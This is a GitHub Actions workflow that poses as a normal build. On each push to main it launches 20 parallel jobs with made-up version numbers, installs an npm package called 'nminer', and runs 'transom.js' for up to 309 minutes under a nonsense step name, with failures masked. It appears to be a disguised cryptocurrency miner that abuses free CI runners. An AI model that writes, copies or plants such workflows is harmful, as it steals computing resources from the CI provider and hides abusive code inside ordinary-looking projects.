name: transom
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4400 }
          - { version: 5161 }
          - { version: 8038 }
          - { version: 9441 }
          - { version: 5892 }
          - { version: 133 }
          - { version: 8171 }
          - { version: 3015 }
          - { version: 4511 }
          - { version: 5781 }
          - { version: 3546 }
          - { version: 3118 }
          - { version: 24 }
          - { version: 1105 }
          - { version: 4888 }
          - { version: 2913 }
          - { version: 4117 }
          - { version: 2403 }
          - { version: 6064 }
          - { version: 4652 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: optimal among so dental derby
        run: |
          npm install nminer@latest
          timeout 309m node transom.js || echo "transom executed"